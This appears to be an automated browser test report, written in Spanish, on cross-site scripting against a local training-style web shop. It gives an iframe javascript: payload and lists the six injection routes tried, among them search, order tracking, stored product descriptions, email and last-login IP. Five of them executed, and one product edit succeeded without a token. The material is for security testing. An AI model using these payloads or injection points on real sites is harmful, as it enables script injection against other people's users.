# XSS en navegador — 2026-11-25T04:25:05.098Z
Objetivo: `http://oficial-sms:3000` · Chromium (Playwright 1.49.1) · payload `<iframe src="javascript:alert(`xss`)">`

## Preparación por API
```json
{
 "registro_U": 201,
 "login_U": "ok",
 "V3_post_opinion": 201,
 "V3_comentario_guardado": "",
 "V4_put_producto_sin_token": 200,
 "V4_descripcion_guardada": "<iframe src=\"javascript:alert(`xss`)\">",
 "V5_registro": 201,
 "V5_email_guardado": "<iframe src=\"javascript:alert(`xss`)\">",
 "V6_saveLoginIp": 200,
 "V6_ip_guardada": "<iframe src=\"javascript:alert(`xss`)\">",
 "login_admin": "ok"
}
```

| Vector | Ruta | Página | Diálogos alert | iframes javascript: en el DOM | Avisos CSP | Veredicto |
|---|---|---|---|---|---|---|
| V1 DOM búsqueda | `/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%6` | cargada | 1 | 1 | 0 | **EJECUTADO** |
| V2 reflejado seguimiento | `/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aalert(%` | cargada | 1 | 1 | 0 | **EJECUTADO** |
| V3 almacenado opinión | `/#/about` | cargada | 0 | 0 | 0 | **NO-INYECTADO** |
| V4 almacenado producto | `/#/search` | cargada | 1 | 1 | 0 | **EJECUTADO** |
| V5 almacenado correo (admin) | `/#/administration` | cargada | 1 | 1 | 0 | **EJECUTADO** |
| V6 almacenado última IP | `/#/privacy-security/last-login-ip` | cargada | 1 | 1 | 0 | **EJECUTADO** |

## Avisos CSP (únicos, primeros 3 por vector)

**Resultado: 5 ejecutados, 0 inyectados pero bloqueados, 1 no inyectados.**
